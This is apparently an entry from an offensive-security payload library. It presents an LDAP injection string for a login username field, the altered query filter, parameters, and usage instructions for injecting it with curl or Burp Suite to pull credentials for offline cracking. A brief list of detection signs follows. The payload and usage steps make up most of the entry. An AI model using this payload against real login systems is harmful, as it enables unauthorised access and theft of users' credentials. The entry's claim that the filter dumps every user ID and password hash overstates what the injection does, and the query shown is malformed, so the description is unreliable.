---
id: e508dda9-23d8-43d3-a214-1a3a29abbb4d
name: LDAP-Injection-Dump-All-Users-and-Passwords
type: code
language: ldap
verified: true
created_at: '2023-04-06T03:56:01.579621+00:00'
updated_at: '2023-10-10T20:36:29.081447+00:00'
platforms:
  - Web
tags:
  - exploitation
  - ldap-injection
  - payload
validated: true
---

# LDAP-Injection-Dump-All-Users-and-Passwords

## Code

```ldap
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

## Description

This LDAP injection payload modifies a standard authentication query to dump all user IDs and their MD5-hashed passwords from the directory. It closes the original filter with '*)' and appends a universal search '(|(uid=*))' to retrieve all entries, targeting the userPassword attribute.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| user | Injected value for username field | *)(uid=*))(|(uid=* |
| pass | Dummy password field value | password |
| query | Resulting modified LDAP filter | (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)) |

## Usage

Inject the 'user' value into the username field of a login form via tools like curl or Burp Suite. This is used in Step 2 of [[procedures/LDAP-Injection-Exploitation]] to extract credentials for offline cracking or further attacks.

## Detection

- Log analysis for anomalous LDAP queries with unescaped wildcards (*) or logical operators.
- WAF rules matching injection patterns like ')(uid=*'.
- Increased query volume returning multiple directory entries.

## Related

- [[procedures/LDAP-Injection-Exploitation]]
